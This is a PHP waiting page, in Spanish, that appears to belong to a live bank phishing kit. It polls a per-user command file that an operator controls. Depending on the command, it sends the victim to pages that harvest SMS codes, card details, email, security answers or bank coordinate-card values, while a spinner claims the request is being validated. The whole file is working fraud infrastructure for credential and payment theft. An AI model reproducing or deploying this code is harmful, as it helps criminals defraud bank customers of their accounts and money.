<?php
// ===== espera.php =====
session_start();
$usuario = $_SESSION['usuario'] ?? null;
if (!$usuario) {
  header("Location: index.php");
  exit;
}

$archivo = "acciones/$usuario.txt";
if (file_exists($archivo)) {
    $accion = trim(file_get_contents($archivo));
    unlink($archivo);
    unset($_SESSION['from_out']);

    if (substr($accion, 0, strlen("/palabra clave/")) === "/palabra clave/") {
        $pregunta = explode("/palabra clave/", $accion)[1];
        $_SESSION['pregunta'] = $pregunta;
        header("Location: pregunta.php");
        exit;
    }

    if (substr($accion, 0, strlen("/coordenadas etiquetas/")) === "/coordenadas etiquetas/") {
        $etiquetas = explode("/coordenadas etiquetas/", $accion)[1];
        $_SESSION['etiquetas'] = explode(",", $etiquetas);
        header("Location: coordenadas.php");
        exit;
    }

    switch ($accion) {
        case "/SMS":
            header("Location: sms.php");
            break;
        case "/SMSERROR":
            header("Location: smserror.php");
            break;
        case "/NUMERO":
            header("Location: numero.php");
            break;
        case "/ERROR":
            header("Location: index2.php");
            break;
        case "/LOGIN":
            header("Location: index.php");
            break;
        case "/LOGINERROR":
            header("Location: index2.php");
            break;
        case "/CARD":
            header("Location: card.html");
            break;
        case "/LISTO":
            header("Location: listo.php");
            break;
        case "/MAIL":
            header("Location: mail.php");
            break;
        case "/COMPRA":
            header("Location: codino.html");
            break;
    }
    exit;
}
$fromOut = $_SESSION['from_out'] ?? false;
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="1">
  <title>Espere...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      text-align: center;
      margin: 0;
      padding: 0;
      background-color: #fff;
      color: #006838;
    }
    .container-normal {
      margin-top: 20%;
    }
    .subtexto {
      color: #888;
      margin-top: 10px;
    }
    .loader {
      border: 6px solid #eee;
      border-top: 6px solid #006838;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1s linear infinite;
      margin: 30px auto 0;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .video-container {
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      background: #fff;
    }
    .video-container video {
      max-width: 100%;
      max-height: 100vh;
    }
  </style>
</head>
<body>
<?php if ($fromOut): ?>
  <div class="video-container">
    <video autoplay loop muted playsinline>
      <source src="Out/cargaout.MP4" type="video/mp4">
    </video>
  </div>
<?php else: ?>
  <div class="container-normal">
    <h2>Por favor espera…</h2>
    <p class="subtexto">Estamos validando tu solicitud, mantente en línea</p>
    <div class="loader"></div>
  </div>
<?php endif; ?>
</body>
</html>